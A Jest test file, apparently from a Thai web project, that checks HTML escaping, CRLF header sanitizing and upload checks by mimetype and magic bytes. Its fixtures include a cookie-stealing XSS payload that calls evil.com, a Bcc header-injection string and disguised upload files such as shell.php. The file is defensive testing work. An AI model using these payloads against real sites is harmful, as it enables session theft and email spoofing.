import { writeFileSync, existsSync, mkdirSync, rmSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import { escapeHtml, sanitizeHeaderValue } from "./html.util";
import {
  assertRealFileType,
  makeFileFilter,
  safeExtensionFor,
  IMAGE_UPLOAD,
  DOCUMENT_UPLOAD,
} from "./upload.util";

describe("การป้องกันฝั่งความปลอดภัย (OWASP)", () => {
  describe("escapeHtml — A05 Injection ในอีเมล", () => {
    it("ตัดฟันสคริปต์ที่ผู้ใช้ยัดมาในชื่อกิจกรรม", () => {
      const evil =
        "<img src=x onerror=\"fetch('//evil.com?c='+document.cookie)\">";
      const out = escapeHtml(evil);
      expect(out).not.toContain("<img");
      expect(out).not.toContain('"');
      expect(out).toContain("&lt;img");
    });

    it("จัดการ null/undefined โดยไม่พัง", () => {
      expect(escapeHtml(null)).toBe("");
      expect(escapeHtml(undefined)).toBe("");
    });
  });

  describe("sanitizeHeaderValue — CRLF header injection", () => {
    it("ตัด CRLF ที่ใช้แอบเพิ่มผู้รับอีเมล", () => {
      const evil = "กิจกรรมปกติ\r\nBcc: victim@example.com";
      const out = sanitizeHeaderValue(evil);
      expect(out).not.toMatch(/[\r\n]/);
      expect(out).not.toContain("\r");
    });
  });

  describe("upload — A05: ตรวจไฟล์จริง ไม่ใช่แค่ชื่อไฟล์", () => {
    const dir = join(tmpdir(), "compactive-upload-test");

    beforeAll(() => {
      if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
    });
    afterAll(() => {
      rmSync(dir, { recursive: true, force: true });
    });

    it("นามสกุลที่เก็บลงดิสก์มาจาก mimetype ไม่ใช่ชื่อไฟล์ที่ผู้ใช้ส่งมา", () => {
      expect(safeExtensionFor(IMAGE_UPLOAD, "image/png")).toBe(".png");
      expect(safeExtensionFor(IMAGE_UPLOAD, "text/html")).toBeNull();
      expect(safeExtensionFor(IMAGE_UPLOAD, "image/svg+xml")).toBeNull();
    });

    it("ปฏิเสธเมื่อ mimetype ไม่อยู่ใน allowlist (เช่น SVG ที่รัน script ได้)", (done) => {
      const filter = makeFileFilter(IMAGE_UPLOAD);
      filter(
        {},
        { originalname: "logo.svg", mimetype: "image/svg+xml" },
        (err, ok) => {
          expect(err).toBeTruthy();
          expect(ok).toBe(false);
          done();
        },
      );
    });

    it("ปฏิเสธเมื่อแก้ชื่อไฟล์ให้ขัดกับ mimetype (ทริกยอดฮิตใน Burp)", (done) => {
      const filter = makeFileFilter(IMAGE_UPLOAD);
      filter(
        {},
        { originalname: "shell.php", mimetype: "image/png" },
        (err, ok) => {
          expect(err).toBeTruthy();
          expect(ok).toBe(false);
          done();
        },
      );
    });

    it("ยอมรับไฟล์ที่ทั้ง mimetype และนามสกุลถูกต้อง", (done) => {
      const filter = makeFileFilter(IMAGE_UPLOAD);
      filter(
        {},
        { originalname: "poster.png", mimetype: "image/png" },
        (err, ok) => {
          expect(err).toBeNull();
          expect(ok).toBe(true);
          done();
        },
      );
    });

    it("ลบไฟล์ทิ้งเมื่อเนื้อไฟล์จริงไม่ใช่รูป แม้จะผ่านด่านนามสกุล/mimetype มาแล้ว", () => {
      const fake = join(dir, "fake.png");
      // ไฟล์ HTML ที่ตั้งชื่อ .png และประกาศ mimetype เป็น image/png
      writeFileSync(
        fake,
        "<html><script>alert(document.domain)</script></html>",
      );

      expect(() => assertRealFileType(IMAGE_UPLOAD, fake)).toThrow();
      expect(existsSync(fake)).toBe(false); // ต้องถูกลบทิ้ง ไม่ค้างบนเซิร์ฟเวอร์
    });

    it("ปล่อยผ่านเมื่อ magic bytes เป็น PNG จริง", () => {
      const real = join(dir, "real.png");
      writeFileSync(
        real,
        Buffer.from([
          0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00,
        ]),
      );

      expect(() => assertRealFileType(IMAGE_UPLOAD, real)).not.toThrow();
      expect(existsSync(real)).toBe(true);
    });

    it("ตรวจ magic bytes ของเอกสารได้ด้วย (PDF จริง vs ปลอม)", () => {
      const realPdf = join(dir, "real.pdf");
      writeFileSync(realPdf, Buffer.from("%PDF-1.7\n"));
      expect(() => assertRealFileType(DOCUMENT_UPLOAD, realPdf)).not.toThrow();

      const fakePdf = join(dir, "fake.pdf");
      writeFileSync(fakePdf, Buffer.from("MZ\x90\x00 executable"));
      expect(() => assertRealFileType(DOCUMENT_UPLOAD, fakePdf)).toThrow();
    });
  });
});
